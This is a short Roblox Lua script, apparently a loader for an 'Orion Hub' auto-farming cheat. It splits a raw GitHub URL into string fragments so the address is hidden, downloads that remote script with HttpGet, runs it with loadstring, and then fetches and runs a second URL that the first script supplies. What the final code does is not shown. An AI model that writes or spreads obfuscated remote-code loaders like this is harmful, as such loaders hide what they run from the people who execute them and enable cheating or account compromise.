-- Breaking up the URL into smaller parts without breaking it
local urlPart1 = "h" .. "t" .. "tps"
local urlPart2 = "://" .. "r" .. "aw"
local urlPart3 = "g" .. "i" .. "t" .. "hub"
local urlPart4 = ".com" .. "/"
local urlPart5 = "M" .. "elharper"
local urlPart6 = "G" .. "abe" .. "Boa2"
local urlPart7 = "r" .. "ef" .. "s" .. "/"
local urlPart8 = "he" .. "ads" .. "/"
local urlPart9 = "m" .. "ai" .. "n"
local urlPart10 = "/" .. "ur" .. "l_" .. "de" .. "co" .. "der"
local urlPart11 = ".l" .. "ua"

-- Combine the parts to reconstruct the full URL
local fullUrl = urlPart1 .. urlPart2 .. urlPart3 .. urlPart4 .. urlPart5 .. urlPart6 ..
                urlPart7 .. urlPart8 .. urlPart9 .. urlPart10 .. urlPart11

-- Fetch the URL decoder script
local urlDecoderScript = game:HttpGet(fullUrl)
local urlDecoder = loadstring(urlDecoderScript)()  -- Execute the URL decoder script and return the object

-- Access the decoded URL and whitelist check function
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

-- Check if the decoded URL is valid and not empty
if decodedUrl and decodedUrl ~= "" then
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    local success, errorMessage = pcall(function()
        loadstring(game:HttpGet(decodedUrl))()
    end)
    if not success then
        warn("Error loading script:", errorMessage) -- Error loading the script
    end
else
    warn("Decoded URL is invalid or empty!")
end
